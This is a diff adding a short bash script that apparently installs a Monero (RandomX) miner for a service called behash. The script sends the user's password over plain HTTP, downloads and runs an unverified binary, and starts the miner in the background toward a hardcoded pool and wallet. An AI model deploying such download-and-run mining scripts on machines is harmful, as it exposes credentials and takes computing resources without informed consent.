@@ -1,0 +1,23 @@
+#!/bin/bash
+
+username=$1
+password=$2
+pcname=$3
+unamestr=`uname`
+downurl=""
+mkdir -p behash
+cd behash
+if [[ "$unamestr" == 'Linux' ]]; then
+   echo "linux"
+   downurl="http://behash.com/behashwork.tar.gz"
+elif [[ "$unamestr" == 'Darwin' ]]; then
+   echo "osx"
+   downurl="http://behash.com/behashwork.tar.gz"
+fi
+re=$(curl http://behash.com/api/v1/newlogin?account=$username\&password=$password)
+curl -o down.tar.gz $downurl
+tar -xvzf down.tar.gz
+rm down.tar.gz
+cd behashwork
+chmod a+x behash
+./behash -o xmr.haxibao.cn:13531 -u 4A3UaV5a2kZLd8dNBPDMA7BBhJGyCxcFVip3rJCgnhcciSzempVCwB4AZGf3KNWVeEihAGoF4ZYhhU6bePeEP3eh9ke26P7 -a rx/0 --rig-id="${re}hhh${pcname}" --donate-level=1 --background
